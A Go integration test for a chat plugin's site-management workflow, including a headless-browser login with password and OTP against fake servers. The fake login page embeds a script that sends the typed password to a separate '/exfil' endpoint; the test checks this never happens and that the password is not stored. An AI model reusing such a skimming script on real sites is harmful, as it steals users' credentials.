package app

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"light-media/internal/sites"
)

func TestOriginalLarkSiteInteractionLinuxAMD64(t *testing.T) {
	bundle := os.Getenv("SOURCE_LARK_MESSAGER_PACKAGE_DIR")
	if runtime.GOARCH != "amd64" || bundle == "" {
		t.Skip("requires the indexed Linux amd64 LarkMessager package")
	}
	t.Setenv("MP_SERVER_HOST", "")
	if os.Getenv("CLOAKBROWSER_BINARY_PATH") == "" {
		t.Skip("requires Chromium in the isolated Linux image")
	}
	const secret = "owned-unpersisted-site-password"
	var foreignRequests, rootRequests, faviconRequests, credentialPosts, otpPosts atomic.Int32
	foreign := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		foreignRequests.Add(1)
		w.WriteHeader(204)
	}))
	t.Cleanup(foreign.Close)
	tracker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		switch r.URL.Path {
		case "/":
			rootRequests.Add(1)
			fmt.Fprintf(w, `<!doctype html><form method="POST" action="/login"><input name="username"><input name="password" type="password"><input name="rememberme" type="checkbox" value="yes"><button type="submit">登录</button></form><script>document.querySelector('form').onsubmit=event=>{event.preventDefault();const form=event.currentTarget;fetch(%q+encodeURIComponent(form.elements.password.value),{mode:'no-cors'}).catch(()=>{}).finally(()=>form.submit())}</script>`, foreign.URL+"/exfil?password=")
		case "/favicon.ico":
			faviconRequests.Add(1)
			http.NotFound(w, r)
		case "/login":
			if r.Method != http.MethodPost || r.FormValue("username") != "owned-user" || r.FormValue("password") != secret || r.FormValue("rememberme") != "yes" {
				http.Error(w, "synthetic form assertion failed", http.StatusForbidden)
				return
			}
			credentialPosts.Add(1)
			http.SetCookie(w, &http.Cookie{Name: "owned_pre", Value: "otp-stage", HttpOnly: true, Path: "/"})
			http.Redirect(w, r, "/verify", http.StatusSeeOther)
		case "/verify":
			if pre, err := r.Cookie("owned_pre"); err != nil || pre.Value != "otp-stage" {
				http.Error(w, "synthetic pre-login session missing", http.StatusForbidden)
				return
			}
			if r.Method == http.MethodGet {
				_, _ = io.WriteString(w, `<!doctype html><form method="POST"><input name="two_step_code"><button type="submit">确认</button></form>`)
				return
			}
			if r.FormValue("two_step_code") != "123456" {
				http.Error(w, "synthetic OTP assertion failed", http.StatusForbidden)
				return
			}
			otpPosts.Add(1)
			http.SetCookie(w, &http.Cookie{Name: "owned_pre", MaxAge: -1, Path: "/"})
			http.SetCookie(w, &http.Cookie{Name: "owned_session", Value: "fresh-cookie", HttpOnly: true, Path: "/"})
			_, _ = io.WriteString(w, `<!doctype html><a href="/logout">退出</a>`)
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(tracker.Close)
	type cardCall struct{ method, path, recipient, content string }
	cards := make(chan cardCall, 24)
	unverifiedFinished := make(chan struct{}, 1)
	provider := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := strings.TrimPrefix(r.URL.Path, "/open-apis")
		switch {
		case path == "/auth/v3/tenant_access_token/internal":
			_, _ = io.WriteString(w, `{"code":0,"tenant_access_token":"fixture-token"}`)
		case strings.Contains(path, "/reactions"):
			if r.Method == http.MethodDelete && strings.Contains(path, "/om_unverified/") {
				unverifiedFinished <- struct{}{}
			}
			_, _ = io.WriteString(w, `{"code":0,"data":{"reaction_id":"rx_fixture"}}`)
		case path == "/im/v1/messages" || strings.HasPrefix(path, "/im/v1/messages/om_"):
			var in struct {
				Content string `json:"content"`
				To      string `json:"receive_id"`
			}
			_ = json.NewDecoder(r.Body).Decode(&in)
			select {
			case cards <- cardCall{r.Method, path, in.To, in.Content}:
			default:
				t.Error("unexpected extra Lark card")
			}
			if r.Method == http.MethodPatch && strings.Contains(in.Content, "当前操作：禁用站点") {
				_, _ = io.WriteString(w, `{"code":230001,"msg":"fixture edit rejected"}`)
				return
			}
			_, _ = io.WriteString(w, `{"code":0,"data":{"message_id":"om_site_card","chat_id":"oc_sites"}}`)
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(provider.Close)
	a := newTestApp(t)
	a.pluginOriginalLarkTestOrigin = provider.URL + "/open-apis"
	admin := setupTestAdmin(t, a)
	settings := a.Settings()
	for n := 1; n <= 7; n++ {
		entry := SiteConfig{Enabled: true,
			Config:      sites.Config{ID: fmt.Sprintf("owned_site_%d", n), Name: fmt.Sprintf("Owned site %d", n), Kind: "rousi", BaseURL: fmt.Sprintf("http://127.0.0.1:%d", 42100+n), Cookie: "synthetic-cookie", Timeout: 10},
			SiteOptions: SiteOptions{Priority: 8 - n, Render: n == 7},
		}
		if n == 7 {
			entry.BaseURL = tracker.URL
		}
		settings.Sites = append(settings.Sites, entry)
	}
	a.settingsMu.Lock()
	err := a.saveSettings(t.Context(), settings)
	a.settingsMu.Unlock()
	if err != nil {
		t.Fatal(err)
	}
	a.Start(t.Context())
	installMergeSiteSwitchPackage(t, a, admin, bundle, "LarkMessager")
	api := a.Handler()
	base := "/api/plugins/LarkMessager"
	configure := func(verificationToken string) {
		t.Helper()
		body := mustCleanSeedJSON(map[string]any{"enabled": true, "app_id": "fixture-id", "app_secret": "fixture-secret", "chat_id": "oc_sites", "verification_token": verificationToken})
		response := callTest(t, api, "PUT", base, string(body), admin, "")
		assertOriginalRegistrySuccess(t, response.Code, response.Body.Bytes())
	}
	post := func(eventType string, fields map[string]any) {
		t.Helper()
		raw := mustCleanSeedJSON(map[string]any{"header": map[string]any{"event_type": eventType}, "event": fields})
		response := callTest(t, api, "POST", base+"/api/webhook?token=owned-verification", string(raw), nil, "")
		if response.Code != 200 || !strings.Contains(response.Body.String(), `"success":true`) {
			t.Fatalf("webhook admission failed: %d", response.Code)
		}
	}
	sendText := func(user, id, text string) {
		t.Helper()
		post("im.message.receive_v1", map[string]any{
			"sender":  map[string]any{"sender_id": map[string]any{"open_id": user}},
			"message": map[string]any{"message_id": id, "chat_id": "oc_sites", "message_type": "text", "content": string(mustCleanSeedJSON(map[string]string{"text": text}))},
		})
	}
	click := func(user, callback string) {
		t.Helper()
		post("card.action.trigger", map[string]any{
			"operator": map[string]any{"open_id": user}, "context": map[string]any{"open_message_id": "om_site_card", "open_chat_id": "oc_sites"},
			"action": map[string]any{"value": map[string]string{"callback_data": callback}},
		})
	}
	next := func(method string, fragments ...string) cardCall {
		t.Helper()
		select {
		case card := <-cards:
			if card.method != method {
				t.Fatalf("unexpected card method %s %s, wanted %s", card.method, card.path, method)
			}
			for _, text := range fragments {
				if !strings.Contains(card.content, text) {
					t.Fatalf("missing %q in card %s (page=%d favicon=%d login=%d otp=%d foreign=%d)", text, card.content, rootRequests.Load(), faviconRequests.Load(), credentialPosts.Load(), otpPosts.Load(), foreignRequests.Load())
				}
			}
			if strings.Contains(card.content, "synthetic-cookie") || strings.Contains(card.content, "fresh-cookie") || strings.Contains(card.content, secret) {
				t.Fatal("site listing leaked cookie material")
			}
			return card
		case <-time.After(20 * time.Second):
			t.Fatalf("no %s card for %v", method, fragments)
			return cardCall{}
		}
	}

	configure("")
	sendText("ou_other", "om_unverified", "/sites disable 7")
	select {
	case <-unverifiedFinished:
	case <-time.After(6 * time.Second):
		t.Fatal("unverified event never reached the ordinary reaction cleanup")
	}
	if !a.Settings().Sites[6].Enabled || len(cards) != 0 {
		t.Fatal("an unverified Lark event entered the native site interaction")
	}
	configure("owned-verification")
	sendText("ou_owner", "om_open", "/sites")
	first := next(http.MethodPost, "站点管理", "Owned site 1", "Owned site 6", "第 1/2 页，共 7 个站点")
	if strings.Contains(first.content, "Owned site 7") {
		t.Fatal("the seventh row was visible on the first page")
	}
	callback := regexp.MustCompile(`sites:[0-9a-f]{12}:`).FindString(first.content)
	if callback == "" || !strings.Contains(first.content, callback+"page-next") {
		t.Fatal("missing source next-page callback")
	}
	click("ou_other", callback+"page-next")
	if denied := next(http.MethodPost, "站点交互已失效，请重新发送 /sites"); denied.recipient != "ou_other" {
		t.Fatal("invalid session notice was not addressed to its sender")
	}
	click("ou_owner", callback+"page-next")
	second := next(http.MethodPatch, "Owned site 7", "第 2/2 页，共 7 个站点", callback+"page-prev")
	if second.path != "/im/v1/messages/om_site_card" || strings.Contains(second.content, "Owned site 6") {
		t.Fatal("next-page callback did not edit the original card")
	}
	click("ou_owner", callback+"clamp")
	next(http.MethodPatch, "第 2/2 页")
	click("ou_owner", callback+"disable")
	next(http.MethodPatch, "当前操作：禁用站点")
	next(http.MethodPost, "当前操作：禁用站点")
	sendText("ou_owner", "om_disable", "站点７, 999, 7")
	next(http.MethodPost, "已禁用 2 个站点：Owned site 7, Owned site 7；未找到：999")
	next(http.MethodPost, "Owned site 7 | 禁用", "第 2/2 页")
	if current := a.Settings().Sites; current[6].Enabled || !current[0].Enabled || current[6].Cookie != "synthetic-cookie" {
		t.Fatal("the site settings write was not isolated to the selected state")
	}
	click("ou_owner", callback+"cookie")
	next(http.MethodPatch, "当前操作：更新站点 Cookie")
	sendText("ou_owner", "om_cookie", "7 owned-user "+secret+" 123456")
	next(http.MethodPost, "【Owned site 7】Cookie&UA 更新成功")
	next(http.MethodPost, "第 2/2 页")
	current := a.Settings().Sites[6]
	if current.Cookie != "owned_session=fresh-cookie; " || !strings.Contains(current.UserAgent, "Chrome") || current.Enabled ||
		credentialPosts.Load() != 1 || otpPosts.Load() != 1 || foreignRequests.Load() != 0 {
		t.Fatal("browser login did not persist verified Cookie+UA or attempted cross-origin credential transfer")
	}
	rows, err := a.Store.DB.QueryContext(t.Context(), "SELECT payload FROM records WHERE kind='message'")
	if err != nil {
		t.Fatal(err)
	}
	for rows.Next() {
		var raw []byte
		var row notificationRecord
		var decrypted originalMessageHistoryPayload
		if err := rows.Scan(&raw); err != nil || json.Unmarshal(raw, &row) != nil || a.Store.Unseal(row.ProtectedContent, &decrypted) != nil {
			t.Fatal("could not check sealed incoming message history")
		}
		if strings.Contains(string(decrypted.SourceMessage), secret) {
			t.Fatal("pending site password was persisted in message history")
		}
	}
	err = rows.Err()
	rows.Close()
	if err != nil {
		t.Fatal(err)
	}
	sendText("ou_owner", "om_replace", "/sites")
	newCard := next(http.MethodPost, "第 1/2 页")
	if strings.Contains(newCard.content, callback) {
		t.Fatal("new /sites command reused an old session")
	}
	click("ou_owner", callback+"enable")
	next(http.MethodPost, "站点交互已失效，请重新发送 /sites")
	t.Log("indexed Lark worker delivered /sites pagination, user-owned edits, fallback send, duplicate/missing ID feedback, durable site toggle, private pending credentials, real browser login with remember and a second OTP page, no cross-origin submission, and replacement of the old card")
}
